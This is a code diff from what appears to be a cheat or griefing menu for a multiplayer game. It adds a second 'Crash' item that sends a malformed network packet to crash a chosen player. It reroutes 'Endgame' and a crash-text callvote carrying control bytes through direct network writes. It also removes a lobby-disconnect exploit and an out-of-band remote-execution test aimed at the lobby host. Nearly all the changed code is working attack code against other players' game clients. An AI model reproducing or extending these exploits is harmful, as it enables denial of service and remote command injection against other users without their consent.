@@ -295,13 +295,28 @@ namespace menu
 							static auto freeze = false;
 							ImGui::Checkbox("Freeze", &freeze);
 							
-							if (ImGui::MenuItem("Crash"))
+							if (ImGui::MenuItem("Crash (1)"))
 							{
 								exploit::send_crash(netadr, player_xuid, freeze);
+							}
 
-								if (in_game && game::centity(client_num)->is_alive())
+							if (ImGui::MenuItem("Crash (2)"))
+							{
+								const game::net::netchan::write_packet packet =
 								{
-									game::net::netchan::write({ 69, game::clc()->serverMessageSequence, 0x10000 }, "", session->host.info.netAdr, session->host.info.xuid, player_xuid);
+									game::cl()->serverId,
+									0,
+									0x10000,
+								};
+
+								if (in_game)
+								{
+									const auto clc = game::clc();
+									game::net::netchan::write(packet, clc->serverAddress, session->host.info.xuid, player_xuid, false);
+								}
+								else
+								{
+									game::net::netchan::write(packet, netadr, player_xuid, 0xDEADFA11, false);
 								}
 							}
 
@@ -328,11 +343,6 @@ namespace menu
 							if (ImGui::MenuItem("Disconnect client from lobby"))
 							{
 								exploit::lobby_msg::send_disconnect_client(session, player_xuid);
-							}
-
-							if (ImGui::MenuItem("Disconnect from lobby"))
-							{
-								exploit::lobby_msg::send_disconnect(session, player_xuid);
 							}
 
 							if (ImGui::BeginMenu("Send OOB##" + std::to_string(client_num), can_connect_to_player))
@@ -466,6 +476,7 @@ namespace menu
 					ImGui::Checkbox("Log server commands", &events::server_command::log_commands);
 					ImGui::Checkbox("Spoof IP address", &events::spoof_ip);
 					ImGui::Checkbox("Prevent join", &events::prevent_join);
+					ImGui::Checkbox("Block steam P2P packets", &steam::block_p2p_packets);
 					ImGui::Checkbox("Don't update presence", &events::no_presence);
 
 					if (ImGui::CollapsingHeader("Removals", ImGuiTreeNodeFlags_Leaf))
@@ -503,7 +514,7 @@ namespace menu
 
 						if (ImGui::MenuItem("Endgame"))
 						{
-							game::CL_AddReliableCommand(0, "lobbyvm Engine.SendMenuResponse(num:0,str:popup_leavegame,str:endround)");
+							game::net::netchan::write("lobbyvm Engine.SendMenuResponse(num:0,str:popup_leavegame,str:endround,);");
 						}
 
 						if (ImGui::MenuItem("Send crash text", nullptr, nullptr, session))
@@ -516,7 +527,7 @@ namespace menu
 
 							if (in_game)
 							{
-								command::execute("callvote map ^H\x7F\x7F\x12" "postfx_electrified");
+								game::net::netchan::write("callvote map ^H\x7F\x7F\x12" "postfx_electrified");
 							}
 						}
 						
@@ -584,12 +595,6 @@ namespace menu
 							);
 							
 							execute_command_line("start " + command);
-						}
-
-						if (selectable("Test"))
-						{
-							auto final_data{ "lobbyvm Engine.Exec(int:0,str:\"" + "fast_restart"s + "\",);\n"s };
-							game::net::netchan::send_oob(session->host.info.xuid, session->host.info.netAdr, final_data, true);
 						}
 					}
 					
